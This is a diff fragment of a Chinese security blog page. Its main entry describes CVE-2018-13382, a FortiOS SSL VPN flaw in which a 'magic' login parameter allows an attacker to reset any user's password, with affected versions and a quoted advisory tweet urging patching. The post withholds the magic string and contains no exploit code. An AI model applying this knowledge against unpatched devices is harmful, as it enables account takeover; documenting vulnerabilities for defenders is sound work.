+            <a href="/2022/07/07/Fortinet%20FortiOS/%EF%BC%88CVE-2018-13383%EF%BC%89Fortinet%20FortiOS%20%E7%BC%93%E5%86%B2%E5%8C%BA%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Fortinet%20FortiOS/%EF%BC%88CVE-2018-13383%EF%BC%89Fortinet%20FortiOS%20%E7%BC%93%E5%86%B2%E5%8C%BA%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qpc8007py8v1hmyfd6h9" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Fortinet FortiOS/（CVE-2018-13382）Fortinet FortiOS magic后门" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Fortinet%20FortiOS/%EF%BC%88CVE-2018-13382%EF%BC%89Fortinet%20FortiOS%20magic%E5%90%8E%E9%97%A8/" class="article-date">
+  <time datetime="2022-07-08T06:25:56.784Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-13382）Fortinet-FortiOS-magic后门"><a href="#（CVE-2018-13382）Fortinet-FortiOS-magic后门" class="headerlink" title="（CVE-2018-13382）Fortinet FortiOS magic后门"></a>（CVE-2018-13382）Fortinet FortiOS magic后门</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Fortinet<br>FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。<br>Fortinet FortiOS 6.0.0版本至6.0.4版本<br>、5.6.0版本至5.6.8版本和5.4.1版本至5.4.10版本中的SSL VPN<br>Web门户存在授权问题漏洞。该漏洞源于网络系统或产品中缺少身份验证措施或身份验证强度不足。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fortinet Fortios 6.2 Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.9<br>Fortinet Fortios 5.4.11</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>在登录页面中，我们找到了一个的特殊参数<code>magic</code>。一旦这个参数为某个特殊字符串，我们就可以修改任何用户的密码。</p>
+<p><img src="/resource/(CVE-2018-13382)FortinetFortiOSmagic%E5%90%8E%E9%97%A8/media/rId24.png"></p>
+<p>根据我们的调查，仍有大量的Fortigate SSL<br>VPN缺少补丁。因此，考虑到其严重性，我们不会透露magic字符串。但是，<a target="_blank" rel="noopener" href="https://twitter.com/codewhitesec/status/1145967317672714240">CodeWhite的研究人员</a>已经复现了这个漏洞。毫无疑问，其他攻击者很快就会利用此漏洞！请尽快更新您的Fortigate！</p>
+<blockquote>
+<p>Critical vulns in<br><a target="_blank" rel="noopener" href="https://twitter.com/hashtag/FortiOS?src=hash&ref_src=twsrc%5Etfw">#FortiOS</a><br>reversed &amp; exploited by our colleagues<br><a target="_blank" rel="noopener" href="https://twitter.com/niph_?ref_src=twsrc%5Etfw">@niph_</a> and<br><a target="_blank" rel="noopener" href="https://twitter.com/ramoliks?ref_src=twsrc%5Etfw">@ramoliks</a> - patch<br>your<br><a target="_blank" rel="noopener" href="https://twitter.com/hashtag/FortiOS?src=hash&ref_src=twsrc%5Etfw">#FortiOS</a><br>asap and see the<br><a target="_blank" rel="noopener" href="https://twitter.com/hashtag/bh2019?src=hash&ref_src=twsrc%5Etfw">#bh2019</a><br>talk of<br><a target="_blank" rel="noopener" href="https://twitter.com/orange_8361?ref_src=twsrc%5Etfw">@orange_8361</a><br>and <a target="_blank" rel="noopener" href="https://twitter.com/mehqq_?ref_src=twsrc%5Etfw">@mehqq_</a> for<br>details (tnx guys for the teaser that got us started)<br><a target="_blank" rel="noopener" href="https://t.co/TLLEbXKnJ4">pic.twitter.com/TLLEbXKnJ4</a></p>
+<p>— Code White GmbH (@codewhitesec)<br><a target="_blank" rel="noopener" href="https://twitter.com/codewhitesec/status/1145967317672714240?ref_src=twsrc%5Etfw">2019年7月2日</a></p>
+</blockquote>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Fortinet%20FortiOS/%EF%BC%88CVE-2018-13382%EF%BC%89Fortinet%20FortiOS%20magic%E5%90%8E%E9%97%A8/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Fortinet%20FortiOS/%EF%BC%88CVE-2018-13382%EF%BC%89Fortinet%20FortiOS%20magic%E5%90%8E%E9%97%A8/" data-id="cl5c2qpc7007oy8v16j2z1kfd" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/72/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/71/">71</a><a class="page-number" href="/page/72/">72</a><span class="page-number current">73</span><a class="page-number" href="/page/74/">74</a><a class="page-number" href="/page/75/">75</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/74/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
